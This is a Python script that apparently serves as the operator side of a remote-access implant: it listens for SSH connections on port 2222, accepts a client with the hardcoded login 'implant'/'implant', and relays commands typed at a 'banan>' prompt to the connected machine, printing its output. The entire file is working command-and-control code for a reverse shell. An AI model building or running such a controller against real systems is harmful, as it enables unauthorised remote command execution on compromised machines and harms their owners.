import paramiko
import os
import socket

class SSHserver(paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == "implant" and password == "implant"):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def main():
    server = '0.0.0.0'
    port = 2222
    CWD = os.getcwd()
    HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'fren'))
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print("listning")
        client, addr = sock.accept()

    except Exception as e:
        print(e)

    SSH_session = paramiko.Transport(client)
    SSH_session.add_server_key(HOSTKEY)
    server = SSHserver()
    SSH_session.start_server(server=server)
    chan = SSH_session.accept()
    if chan is None:
        print("transport error")
        quit()
    print(chan)

    success_msg = chan.recv(1024).decode()
    print(f"{success_msg}")
    chan.send(' ')

    def cmd_handler():
        try:
            while True:
                cmd_line = ("banan> ")
                cmd = input(cmd_line + '')
            
                if cmd == '':
                    cmd_handler()
                else:
                    try:
                        chan.send(cmd)
                        ret_value = chan.recv(8192)
                        print(ret_value.decode())
                    except Exception as e:
                        print (e)

        except  Exception as e:
            print (e)

    cmd_handler()   

if __name__ == '__main__':
    main()